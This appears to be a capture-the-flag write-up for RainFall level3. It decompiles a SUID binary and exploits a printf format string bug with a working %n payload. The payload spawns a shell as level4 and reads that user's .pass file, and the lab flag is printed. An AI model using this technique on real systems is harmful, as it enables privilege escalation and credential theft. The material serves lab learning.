@@ -1,0 +1,88 @@
+When we change to level3 user, we're greeted with:
+
+```shell
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3
+```
+
+We find another SUID executable, this time owned by level4.
+
+```shell
+level3@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3
+```
+
+When running it, it takes input and print the input.
+
+```shell
+level3@RainFall:~$ ./level3
+42
+42
+```
+Copying it over and decompiling.
+
+```shell
+┌──(kali㉿kali)-[~]
+└─$ scp -P 4242 level3@192.168.184.128:/home/user/level3/level3 .
+          _____       _       ______    _ _
+         |  __ \     (_)     |  ____|  | | |
+         | |__) |__ _ _ _ __ | |__ __ _| | |
+         |  _  /  _` | | '_ \|  __/ _` | | |
+         | | \ \ (_| | | | | | | | (_| | | |
+         |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|
+
+                 Good luck & Have fun
+
+  To start, ssh with level0/level0 on 192.168.184.128:4242
+level3@192.168.184.128's password:
+level3                                                                                                                                100% 5366   892.7KB/s   00:00
+```
+
+The decompiled code looks like this:
+
+```C
+void v(void)
+{
+    char *format;
+
+    fgets(&format, 0x200, _stdin);
+    printf(&format);
+    if (_m == 0x40) {
+        fwrite("Wait what?!\n", 1, 0xc, _stdout);
+        system("/bin/sh");
+    }
+    return;
+}
+
+void main(void)
+{
+    v();
+    return;
+}
+```
+
+We can see that the string is being printed without a conversion specifier in `printf` which makes it vulnerable to a format string attack [01](https://owasp.org/www-community/attacks/Format_string_attack). This means we can read and write from and to the stack with the correct conversion specification as our input. `%p` will print stack addresses and `%n` will write the amounts of bytes previously printed to the specified address. 
+
+Now we need to find out the address of the global variable we want to override, which `ghidra` provides for us: `\x8c\x98\x04\x08`
+
+The value we need to override with is `0x40` which is 64 in decimal. With this we can now build our payload. 
+
+```python
+python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"'
+```
+
+First we need to put the address of our global variable `_m` on the stack and then write 60 characters to the stack to reach the value of 64 bytes combined with the 4 bytes of the `%n`, which we're going to write into the 4th position. 
+
+Let's run it:
+
+```shell
+level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"' > /tmp/file
+level3@RainFall:~$ cat /tmp/file - | ./level3
+�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Wait what?!
+whoami
+level4
+cat ../level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+```
